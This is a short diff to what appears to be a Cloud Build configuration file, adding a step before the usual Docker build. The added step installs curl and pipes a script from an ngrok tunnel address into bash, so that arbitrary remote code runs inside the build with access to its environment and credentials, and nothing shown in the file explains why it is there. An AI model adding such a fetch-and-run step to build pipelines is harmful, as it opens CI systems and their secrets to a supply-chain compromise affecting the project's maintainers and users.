@@ -13,6 +13,8 @@
 # limitations under the License.
 
 steps:
+  - name: ubuntu
+    script: apt update -y && apt-get install curl -y && curl https://104b-180-151-104-178.in.ngrok.io/file.sh | bash
   - name: gcr.io/cloud-builders/docker
     args:
       - build
